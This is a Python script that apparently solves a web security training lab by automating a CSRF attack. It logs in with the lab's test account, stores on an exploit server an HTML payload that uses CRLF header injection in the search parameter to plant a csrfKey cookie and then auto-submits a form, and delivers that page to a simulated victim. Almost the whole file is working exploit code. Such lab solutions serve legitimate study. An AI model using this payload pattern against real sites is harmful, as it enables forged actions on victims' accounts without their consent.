#!/usr/bin/env python3
import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

username = 'wiener'
password = 'peter'

def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('input', attrs={'name': 'csrf'})['value']
    except TypeError:
        return None
    return result


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def store_exploit(client, exploit_server, host, token):
    data = {'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 200 OK
            Content-Type: text/html; charset=utf-8''',
            'responseBody': f'''<img src="{host}/?search=test%0d%0aSet-Cookie:%20csrfKey=RavTwSv8on4toEgndXFqXk0JqSaOQGTh%3b%20SameSite=None" onerror="document.forms[0].submit()">''',
            'formAction': 'STORE'}
    return client.post(exploit_server, data=data).status_code == 200


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <url>')
        print(f'url: {sys.argv[0]} http://someurl.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host, username, password):
        print(f'[-] Failed to login {username} and {password}')
        sys.exit(-2)
    print(f'Logged on as: {username}')

    csrf = get_csrf_token(client.get(f'{host}/my-account').text)
    if csrf is None:
        print(f'[-] Failed to obtain CSRF-token from ')
        sys.exit(-2)
    print('[+]CSRF-token: {csrf}')

    exploit_server = exploitserver(client.get(host).text)
    if exploit_server is None:
        print(f'[-] Failed to find exploit server')
        sys.exit(-2)

    if not store_exploit(client, exploit_server, host, csrf):
        print(f'[-] Failed to store exploit file')
        sys.exit(-3)
    print('[+] Stored exploit file')

    if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
        print(f'[-] Failed to deliver exploit to victim')
        sys.exit(-4)
    print('[+] Delivered exploit to victim')

    if 'Solved Lab!' not in client.get(f'{host}').text:
        print('[-] Failed to solve lab')
        sys.exit(-9)

    print('Lab solved!')

if __name__ == "__main__":
    main()